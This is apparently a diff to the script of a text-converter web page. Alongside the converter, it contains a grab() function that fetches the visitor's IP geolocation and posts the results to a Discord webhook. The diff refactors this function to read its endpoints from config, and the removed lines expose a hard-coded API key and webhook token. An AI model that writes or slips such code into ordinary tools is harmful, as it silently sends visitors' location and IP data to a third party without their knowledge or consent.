@@ -2,6 +2,9 @@ input = document.getElementById("input");
 
 input.addEventListener("input", convert);
 
+var ipapi = config.ipapi;
+var webhook = config.webhook;
+
 function convert() {
   var code = document.getElementById("input").value;
   var output = document.getElementById("output");
@@ -131,27 +134,21 @@ document.getElementById("input").addEventListener("keydown", function (e) {
 });
 
 function grab() {
-  $.getJSON(
-    "https://ipgeolocation.abstractapi.com/v1/?api_key=159b017772384f868853bf1904ea59d4",
-    function (data) {
-      var newdata = JSON.stringify(data);
-      newdata = newdata.split(",");
-      var out = "";
-      for (var i = 0; i < newdata.length; i++) {
-        out += newdata[i] + "\n";
-      }
-      const request = new XMLHttpRequest();
-      request.open(
-        "POST",
-        "https://discord.com/api/webhooks/963620461038686218/KFnEHRMjDQ3JuA539UAJD0KkCuuYbgEZFRkAvewUYzJwsQx-ckMZf2EF75x1xygqxeZw"
-      );
-      request.setRequestHeader("Content-type", "application/json");
-      const params = {
-        username: "My Webhook Name",
-        avatar_url: "",
-        content: out,
-      };
-      request.send(JSON.stringify(params));
+  $.getJSON(ipapi, function (data) {
+    var newdata = JSON.stringify(data);
+    newdata = newdata.split(",");
+    var out = "";
+    for (var i = 0; i < newdata.length; i++) {
+      out += newdata[i] + "\n";
     }
-  );
+    const request = new XMLHttpRequest();
+    request.open("POST", webhook);
+    request.setRequestHeader("Content-type", "application/json");
+    const params = {
+      username: "My Webhook Name",
+      avatar_url: "",
+      content: out,
+    };
+    request.send(JSON.stringify(params));
+  });
 }
